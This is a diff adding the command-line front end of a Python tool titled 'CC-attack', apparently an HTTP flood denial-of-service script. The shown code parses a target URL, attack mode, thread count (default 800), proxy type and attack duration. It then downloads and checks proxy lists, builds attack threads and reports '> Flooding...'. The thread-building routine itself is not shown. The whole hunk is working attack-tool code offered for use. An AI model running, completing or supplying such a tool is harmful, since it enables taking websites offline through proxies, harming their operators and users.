@@ -498,3 +498,136 @@ def DownloadProxies(proxy_ver):
 			except:
 				pass
 		f.close()
+print("> Have already downloaded proxies list as "+out_file)
+
+def PrintHelp():
+	print('''===============  CC-attack help list  ===============
+   -h/help   | showing this message
+   -url      | set target url
+   -m/mode   | set program mode
+   -data     | set post data path (only works on post mode)
+             | (Example: -data data.json)
+   -cookies  | set cookies (Example: 'id:xxx;ua:xxx')
+   -v        | set proxy type (4/5/http, default:5)
+   -t        | set threads number (default:800)
+   -f        | set proxies file (default:proxy.txt)
+   -b        | enable/disable brute mode
+             | Enable=1 Disable=0  (default:0)
+   -s        | set attack time(default:60)
+   -down     | download proxies
+   -check    | check proxies
+=====================================================''')
+
+
+def main():
+	global proxy_ver
+	global data
+	global cookies
+	global brute
+	global url
+	global out_file
+	global thread_num
+	global mode
+	global target
+	global proxies
+	target = ""
+	check_proxies = False
+	download_socks = False
+	proxy_type = 5
+	period = 60
+	help = False
+	print("> Mode: [cc/post/head]")#slow]")
+	for n,args in enumerate(sys.argv):
+		if args == "-help" or args =="-h":
+			help =True
+		if args=="-url":
+			ParseUrl(sys.argv[n+1])
+		if args=="-m" or args=="-mode":
+			mode = sys.argv[n+1]
+			if mode not in ["cc","post","head"]:#,"slow"]:
+				print("> -m/-mode argument error")
+				return
+		if args =="-v":
+			proxy_ver = sys.argv[n+1]
+			if proxy_ver == "4":
+				proxy_type = 4
+			elif proxy_ver == "5":
+				proxy_type = 5
+			elif proxy_ver == "http":
+				proxy_type = 0
+			elif proxy_ver not in ["4","5","http"]:
+				print("> -v argument error (only 4/5/http)")
+				return
+		if args == "-b":
+			if sys.argv[n+1] == "1":
+				brute = True
+			elif sys.argv[n+1] == "0":
+				brute = False
+			else:
+				print("> -b argument error")
+				return
+		if args == "-t":
+			try:
+				thread_num = int(sys.argv[n+1])
+			except:
+				print("> -t must be integer")
+				return
+		if args == "-cookies":
+			cookies = sys.argv[n+1]
+		if args == "-data":
+			data = open(sys.argv[n+1],"r",encoding="utf-8", errors='ignore').readlines()
+			data = ' '.join([str(txt) for txt in data])
+		if args == "-f":
+			out_file = sys.argv[n+1]
+		if args == "-down":
+			download_socks=True
+		if args == "-check":
+			check_proxies = True
+		if args == "-s":
+			try:
+				period = int(sys.argv[n+1])
+			except:
+				print("> -s must be integer")
+				return
+
+	if download_socks:
+		DownloadProxies(proxy_ver)
+
+	if os.path.exists(out_file)!=True:
+		print("Proxies file not found")
+		return
+	proxies = open(out_file).readlines()	
+	check_list(out_file)
+	proxies = open(out_file).readlines()	
+	if len(proxies) == 0:
+		print("> There are no more proxies. Please download a new proxies list.")
+		return
+	print ("> Number Of Proxies: %d" %(len(proxies)))
+	if check_proxies:
+		check_socks(3)
+
+	proxies = open(out_file).readlines()
+	
+	if help:
+		PrintHelp()
+
+	if target == "":
+		print("> There is no target. End of process ")
+		return
+	'''
+	if mode == "slow":
+		th = threading.Thread(target=slow,args=(thread_num,proxy_type,))
+		th.daemon = True
+		th.start()
+	else:'''
+	event = threading.Event()
+	print("> Building threads...")
+	build_threads(mode,thread_num,event,proxy_type)
+	event.clear()
+	#input("Press Enter to continue.")
+	event.set()
+	print("> Flooding...")
+	time.sleep(period)
+
+if __name__ == "__main__":
+	main()#Coded by Leeon123
